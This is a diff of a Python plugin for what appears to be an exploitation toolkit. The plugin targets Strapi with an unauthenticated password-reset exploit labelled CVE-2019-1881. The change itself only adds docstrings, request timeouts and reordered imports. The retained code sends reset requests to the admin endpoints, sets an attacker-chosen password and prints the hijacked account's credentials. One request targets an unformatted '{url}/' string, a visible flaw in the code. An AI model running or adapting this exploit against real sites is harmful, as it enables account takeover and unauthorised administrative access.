@@ -1,8 +1,10 @@
-from strapi_plugin import StrapiExploitInterface
-import requests
+'''CVE-2019-1881 exploit for Strapi. '''
 from json import JSONDecodeError
+import requests
+from strapi_plugin import StrapiExploitInterface
 
 class CVE2019_1881(StrapiExploitInterface):
+    '''CVE-2019-1881 exploit for Strapi.'''
     def __init__(self):
         super().__init__("Strapi-CVE-2019-1881", "Unauthenticated Password Reset Vulnerability / Privilege Escalation")
     def check_if_vulnerable(self, version: str) -> bool:
@@ -18,9 +20,9 @@ class CVE2019_1881(StrapiExploitInterface):
             "passwordConfirmation": password
         }
         payload = {"email": email, "url":f"{url}/admin/plugins/users-permissions/auth/reset-password"}
-        requests.post("{url}/", json=payload)
+        requests.post("{url}/", json=payload, timeout=10)
         try:
-            r = requests.post(f"{url}/admin/auth/reset-password", json=params).json()
+            r = requests.post(f"{url}/admin/auth/reset-password", json=params, timeout=10).json()
             if "jwt" not in r:
                 return False
             print(f"[ + ] Password reset successfull.\nUsername: {r['user']['username']}\nEmail: {r['user']['email']}\nPassword: {password}")
@@ -40,4 +42,5 @@ class CVE2019_1881(StrapiExploitInterface):
         self.exploit(url, email, password)
 
 def init():
+    '''Initialize the plugin.'''
     return CVE2019_1881()
